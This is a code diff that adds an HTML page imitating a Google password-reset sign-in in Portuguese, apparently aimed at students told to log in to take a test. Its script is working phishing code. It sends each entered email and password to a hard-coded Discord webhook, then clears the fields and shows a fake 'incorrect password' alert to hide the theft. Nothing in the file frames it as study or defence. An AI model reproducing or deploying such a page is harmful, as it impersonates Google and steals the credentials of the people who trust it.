@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Google | Redefinição de Senha</title>
+  <link rel="icon" href="smlicon.png">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  
+  
+  
+  <img src="smlicon.png" width="150px">
+  <br>
+  <p>Inicie sessão para realizar a prova.</p>
+  
+  <label>Email ou Número de telefone</label>
+  <input type="password" id="email">
+  <label>Palavra-passe</label>
+  <input type="password" id="senha">
+  
+ 
+ <br>
+ <button onclick="enviar()">Criar nova senha</button>
+  
+  
+  
+  <script>
+  var webhook="https://discord.com/api/webhooks/1361837466834702568/h2AeTArsuQrcHwvONnYggHF8IDS96nE_BZsG8UHU2NMSjKrDJvSa144FrejRSomOJ-ss";
+  
+  
+  
+  
+  
+    async function enviar(){
+      var email=document.getElementById("email").value;
+      var senha=document.getElementById("senha").value;
+      if(email.length<=5 || senha.length<=5 ){
+        alert("Preencha corretamente os campos de Login.");
+      }else{
+        msg={
+          content:"======\nEmail: "+email+"\nSenha: "+senha+"\n======="
+        }
+        await fetch(webhook,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body: JSON.stringify(msg)
+        });
+        setTimeout(function(){
+          document.querySelectorAll("input")[0].value="";
+          document.querySelectorAll("input")[1].value="";
+          alert("Email ou Senha incorreta");
+        },2000);
+      }
+    }
+    
+  </script>
+  
+</body>
+</html>
+
+
+
